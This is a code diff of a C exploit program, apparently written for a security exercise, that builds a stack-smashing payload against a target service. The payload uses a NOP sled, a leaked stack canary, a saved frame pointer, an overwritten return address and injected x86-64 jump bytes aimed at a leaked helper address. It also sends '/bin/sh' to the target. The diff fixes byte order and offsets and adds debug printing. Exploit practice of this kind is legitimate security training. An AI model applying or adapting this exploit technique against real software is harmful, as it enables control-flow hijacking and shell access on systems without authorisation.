@@ -61,7 +61,7 @@ int main() {
             cur_auth_bp, cur_auth_cred_loc, curr_auth_cred, curr_private_helper_addr);
 
     // Now, send the payload
-    put_str("p /bin/sh\0\n\0");
+    put_str("p /bin/sh\n");
     send();
     get_formatted("%*s");
 
@@ -69,35 +69,43 @@ int main() {
     void* *expl = (void**)malloc(explsz);
     memset((void*)expl, 0x90, explsz);
 
-    expl[explsz/sizeof(void*)-1] = (void*)curr_auth_cred + 10; // return address
+    expl[explsz/sizeof(void*)-1] = (void*)curr_auth_cred + 12; // return address
     expl[explsz/sizeof(void*)-2] = (void*)cur_auth_bp; // saved rbp value
     expl[explsz/sizeof(void*)-3] = (void*)stack_canary; // canary
     expl[explsz/sizeof(void*)-4] = (void*)curr_auth_cred; // cred
     expl[explsz/sizeof(void*)-5] = (void*)cur_auth_cred_loc; // db
 
 
-    int injected_code_length_in_bytes = 16;
-    uint64_t injected_code[injected_code_length_in_bytes] = {
-        0x48, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
-        0x00, 0x00, 0xff, 0xe0, 0x90, 0x90, 0x90, 0x90
+    uint64_t injected_code[16] = {
+        0x48, 0xb8, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 
+	0x01, 0x01, 0xff, 0xe0, 0x90, 0x90, 0x90, 0x90
     };
+    int injected_code_size = sizeof(injected_code) / sizeof(injected_code[0]);
 
 
-    for (int i = 0; i < 8; ++i) {
+     for (int i = 0; i < 8; i++) {
         uint8_t byte = (curr_private_helper_addr >> (i * 8)) & 0xFF;
-        injected_code[9-i] = byte;
+        injected_code[i+2] = byte;
+     }
+
+    for(int i=0; i<16; i++) {
+    	printf("D0: %lx\n", injected_code[i]);
     }
 
     int curr_expl_location = 0;
-    int shift_bytes;
-    for(int i = 0; i < injected_code_length_in_bytes; i++) {
+    int shift_bytes = 0;
+    for(int i = 0; i < injected_code_size; i++) {
         if(i % 8 == 0) {
             curr_expl_location++;
             expl[curr_expl_location] = 0x0000000000000000;
-            shift_bytes = 7;
+            shift_bytes = 0;
         }
         expl[curr_expl_location] += injected_code[i] << (shift_bytes*8);
-        shift_bytes--;
+        shift_bytes++;
+    }
+
+    for(int i=0; i<explsz/sizeof(void*); i++) {
+    	printf("D1: %x: %lx\n", i, (long unsigned int)expl[i]);
     }
 
     put_str("u ");
